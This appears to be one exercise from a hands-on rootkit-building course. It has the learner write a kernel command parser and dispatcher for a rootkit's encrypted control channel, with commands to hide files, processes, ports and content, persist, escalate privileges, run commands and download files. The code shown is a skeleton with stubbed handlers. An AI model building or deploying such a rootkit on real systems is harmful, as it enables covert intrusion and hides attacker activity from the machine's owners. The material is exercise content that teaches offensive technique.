# Parse and dispatch text commands

A reverse shell lets the operator run userspace commands. But hiding a file,
hiding a PID, toggling persistence: those are kernel operations. No shell
command can do them. You need a protocol.

Build a text command parser that converts decrypted byte buffers
into structured commands, and a dispatcher that routes each command to its
handler.

## Why a protocol

Consider what happens when the operator types `HIDE FILE evidence.log` into
a reverse shell. The shell runs it as a program name, which fails. File hiding
is a kernel operation (hooking getdents64). The only way to trigger it remotely
is to intercept the text before the shell sees it and handle it in kernel space.

The command parser sits between the decrypted frame and the shell. It inspects
each incoming message, and if it matches a known command, dispatches it to the
appropriate kernel handler. Unknown input can be forwarded to the shell.

## Command kinds

```text
PING                --> RK_CMD_PING
STATUS              --> RK_CMD_STATUS
SHELL               --> RK_CMD_SHELL
EXEC <cmd>          --> RK_CMD_EXEC        arg = cmd
DOWNLOAD <path>     --> RK_CMD_DOWNLOAD    arg = path
HIDE FILE <name>    --> RK_CMD_HIDE_FILE   arg = name
UNHIDE FILE <idx>   --> RK_CMD_UNHIDE_FILE arg = idx
HIDE PID <pid>      --> RK_CMD_HIDE_PID    arg = pid
UNHIDE PID <pid>    --> RK_CMD_UNHIDE_PID  arg = pid
HIDE CONTENT <pat>  --> RK_CMD_HIDE_CONTENT arg = pattern
UNHIDE CONTENT <i>  --> RK_CMD_UNHIDE_CONTENT arg = idx
HIDE PORT <port>    --> RK_CMD_HIDE_PORT   arg = port
UNHIDE PORT <port>  --> RK_CMD_UNHIDE_PORT arg = port
PERSIST             --> RK_CMD_PERSIST
UNPERSIST           --> RK_CMD_UNPERSIST
ESCALATE            --> RK_CMD_ESCALATE
INFO                --> RK_CMD_INFO
LIST FILE           --> RK_CMD_LIST        arg = FILE
LIST PID            --> RK_CMD_LIST        arg = PID
(anything else)     --> RK_CMD_UNKNOWN
```

## Data structures

```c
enum rk_cmd_kind {
    RK_CMD_PING,
    RK_CMD_STATUS,
    RK_CMD_SHELL,
    RK_CMD_EXEC,
    RK_CMD_DOWNLOAD,
    RK_CMD_HIDE_FILE,
    RK_CMD_UNHIDE_FILE,
    RK_CMD_HIDE_PID,
    RK_CMD_UNHIDE_PID,
    RK_CMD_HIDE_CONTENT,
    RK_CMD_UNHIDE_CONTENT,
    RK_CMD_HIDE_PORT,
    RK_CMD_UNHIDE_PORT,
    RK_CMD_PERSIST,
    RK_CMD_UNPERSIST,
    RK_CMD_ESCALATE,
    RK_CMD_INFO,
    RK_CMD_LIST,
    RK_CMD_UNKNOWN,
};

struct rk_command {
    enum rk_cmd_kind kind;
    char arg[128];
};
```

## Parsing strategy

The parser receives a byte buffer and its length from a decrypted frame.
Strip any trailing newline, then match from most specific to least specific:

1. Match two-word prefixes first: `HIDE FILE`, `HIDE PID`, `UNHIDE FILE`, etc.
2. Match single-word commands with arguments: `EXEC`, `DOWNLOAD`.
3. Match bare keywords: `PING`, `STATUS`, `SHELL`, etc.
4. Default to `RK_CMD_UNKNOWN`.

Use `strncmp` for prefix matching. Copy the argument portion into `cmd->arg`
with a length check to prevent overflow.

## Dispatch

`rk_command_dispatch` takes a parsed command and calls the appropriate handler:

```c
int rk_command_dispatch(struct rk_ctx *ctx, struct rk_command *cmd)
{
    switch (cmd->kind) {
    case RK_CMD_PING:
        return rk_send_response(ctx, "PONG");
    case RK_CMD_HIDE_FILE:
        return rk_do_hide_file(ctx, cmd->arg);
    /* ... */
    case RK_CMD_UNKNOWN:
        return rk_send_response(ctx, "ERR unknown command");
    }
    return -EINVAL;
}
```

All responses are sent as encrypted frames back through the secure channel.

## Your task

Edit `main.c`:

1. Define the `enum rk_cmd_kind` with all command kinds listed above.
2. Define `struct rk_command` with `kind` and `arg[128]`.
3. Implement `rk_command_parse(buf, len, cmd)` to parse text commands.
4. Implement `rk_command_dispatch(ctx, cmd)` to route commands to handlers.
5. Send responses as encrypted frames (stub the actual handlers for now).

Run:

```sh
./rklings check
```

## References

- [`strncmp`](https://github.com/torvalds/linux/blob/v7.2/lib/string.c)
- [`strncpy`](https://github.com/torvalds/linux/blob/v7.2/lib/string.c)
